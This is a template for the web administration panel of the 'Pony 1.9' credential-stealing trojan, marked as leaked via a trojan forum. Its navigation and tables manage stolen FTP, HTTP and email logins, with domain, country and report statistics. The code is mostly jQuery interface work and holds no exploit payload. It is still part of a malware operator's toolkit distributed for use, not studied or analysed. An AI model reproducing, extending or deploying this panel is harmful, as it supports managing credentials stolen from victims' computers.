{stopwatch}<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
<title>{if $authentication_success}Pony - Admin panel{else}Authorization{/if}</title>
<link rel="shortcut icon" href="includes/design/images/favicon.ico" />
{if $authentication_success}
    <link rel="stylesheet" type="text/css" href="includes/design/style_full.css" />
    <link rel="stylesheet" type="text/css" href="includes/design/theme/jquery-ui-1.8.13.custom.css" />
    <link rel="stylesheet" type="text/css" href="includes/design/theme/ui.dropdownchecklist.themeroller.css" />
    <script type="text/javascript" src="includes/design/jquery-1.6.1.min.js"></script>
    <script type="text/javascript" src="includes/design/jquery-ui-1.8.13.custom.min.js"></script>
    <script type="text/javascript" src="includes/design/jquery.tablehover.min.js"></script>
    <script type="text/javascript" src="includes/design/common.js"></script>
    <script type="text/javascript" src="includes/design/jquery.ui.datepicker-ru.js"></script>
    <script type="text/javascript" src="includes/design/ui.dropdownchecklist.js"></script>
    <script type="text/javascript" src="includes/design/jquery.ajaxq-0.0.1.js"></script>
{* Table row highlite code *}
<script type="text/javascript">
<!--

var
  drop_list_array = new Array('#drop_af', '#drop_as', '#drop_eu', '#drop_na', '#drop_sa', '#drop_oc', '#drop_an', '#drop_\-\-');

function reset_drop_lists()
{
	for (key in drop_list_array)
	{
		$(drop_list_array[key]+" option").attr('selected', 'selected');
		$(drop_list_array[key]).dropdownchecklist('refresh'); 
	}
}

function uncheck_drop_lists()
{
	for (key in drop_list_array)
	{
		$(drop_list_array[key]+" option").removeAttr('selected', '');
		$(drop_list_array[key]+" option").removeAttr('checked', '');
		$(drop_list_array[key]).dropdownchecklist('refresh'); 
	}
}

$(document).ready(function()
{
	$( "#datepicker_from" ).datepicker({
		changeMonth: true,
		changeYear: true
	});
	$( "#datepicker_to" ).datepicker({
		changeMonth: true,
		changeYear: true
	});

	$("#tabs").tabs( { selected: 0 } );
	$( "#tabs" ).tabs({
	   select: function(event, ui) { 
			for (key in drop_list_array)
			{
	   			$(drop_list_array[key]).dropdownchecklist('close'); 
			}
	   }
	});

	updated = false;
	$( "#tabs" ).tabs({
	   show: function(event, ui) { 
		   if (ui.index == 1)
		   {
		   		if (updated == false)
		   		{
		   			updated = true;

					for (key in drop_list_array)
					{
						$(drop_list_array[key]).dropdownchecklist({ firstItemChecksAll: true, width: 150, maxDropHeight: 500 });
					}
				}
		    }	
		}	
	});

	var zebra_tables = new Array("#table_logins", "#table_domains", "#table_stats", "#table_ftp", 
		"#table_http", "#table_email", "#CountryStats", "#FTPClientsStats",
		{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
		"#HTTPClientsStats", 
		{/if}
		{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
		"#EmailClientsStats", 
		{/if}
		"#table_logs", "#table_reports", "#table_view_log", "#table_view_report", "#table_view_report_data", 
		"#table_user_list");
	for (key in zebra_tables)
	{
		$(zebra_tables[key]).tableHover();
	}

	$('p').each(function(){
    	var p = $(this);
    	if( $(this).attr('id').match(/chk_status_/) ) {
			$.ajaxq ("checkqueue", {
			    url: "{$smarty.server.SCRIPT_NAME}?action=ping&routine=ping&domain_id="+$(this).attr('id').substr(11),
			    cache: false,
			    success: function(html)
			    {
			        p.html(html);
			    }
			});
		}
  	});

     
});

//-->
</script>

{else}
    <link rel="stylesheet" type="text/css" href="includes/design/style.css" />
{/if}
</head>
<body>
{if $authentication_success}
<div class="wrapper">
	<div id="header">
			<div id="top">
				<ul>
{append var="nav_links" value="Home" index=""}
{append var="nav_links" value="List FTP" index="ftp"}
{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
{append var="nav_links" value="List HTTP" index="http"}
{/if}
{if $show_other_to_users || $priv_is_admin}
{append var="nav_links" value="Others" index="other"}
{/if}
{append var="nav_links" value="Statistics" index="stats"}
{append var="nav_links" value="Domains" index="ping"}
{append var="nav_links" value="Logs" index="log"}
{append var="nav_links" value="Reports" index="reports"}
{append var="nav_links" value="Management" index="admin"}
{if $show_help_to_users || $priv_is_admin}
{append var="nav_links" value="Help" index="help"}
{/if}
{append var="nav_links" value="Log out" index="exit"}
{foreach from=$nav_links key=action item=contents}
					<li><a href="{$smarty.server.SCRIPT_NAME}{if $action != ""}?action={$action}{/if}"{if $smarty.request.action==$action} class="hover"{/if}>{$contents}</a></li>
{/foreach}
				</ul>
				<div class="pony_hdr_text">Pony 1.9</div>
				<div class="pony_bg"></div>
			</div>

{else}
		<div id="header_nobg">
{/if}
		 <div id="contents"> 
{if $authentication_success}<b>Leaked for <a href="http://TrojanForge.com"><font color="red">TF</font></a></b><br>{/if}